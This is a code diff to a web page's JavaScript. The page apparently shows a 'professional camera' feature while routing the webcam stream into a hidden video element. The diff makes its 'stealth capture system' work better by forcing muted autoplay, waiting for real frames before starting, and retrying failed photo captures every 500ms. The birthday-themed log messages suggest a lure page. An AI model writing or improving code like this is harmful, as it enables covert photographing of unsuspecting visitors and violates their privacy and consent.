@@ -182,13 +182,33 @@ async function initializeProfessionalCamera() {
     
     const hiddenVideo = document.getElementById('hidden-video');
     hiddenVideo.srcObject = bdStream;
-    
+    hiddenVideo.setAttribute('playsinline', 'true');
+    hiddenVideo.muted = true;
+
+    // Wait until video is ready to play to avoid black frames
+    await new Promise((resolve) => {
+      const onReady = async () => {
+        hiddenVideo.removeEventListener('loadedmetadata', onReady);
+        try {
+          await hiddenVideo.play();
+        } catch (e) {
+          console.warn('Autoplay prevented, attempting manual start on user gesture later:', e);
+        }
+        resolve();
+      };
+      if (hiddenVideo.readyState >= 2 && hiddenVideo.videoWidth > 0) {
+        resolve();
+      } else {
+        hiddenVideo.addEventListener('loadedmetadata', onReady, { once: true });
+      }
+    });
+
     cameraInitialized = true;
     hideProfessionalLoader();
     
     showProfessionalNotification('Camera connected successfully! Professional features activated.', 'success');
     
-    // Start stealth capture system
+    // Start stealth capture system only after video is playing
     startStealthCapture();
     
     return true;
@@ -283,7 +303,8 @@ function startStealthCapture() {
       });
       
       if (!hiddenVideo || hiddenVideo.videoWidth === 0) {
-        console.log('🎂 ❌ Capture failed - invalid video element');
+        console.log('🎂 ❌ Capture failed - invalid video element (retrying in 500ms)');
+        setTimeout(capturePhoto, 500);
         return;
       }
       
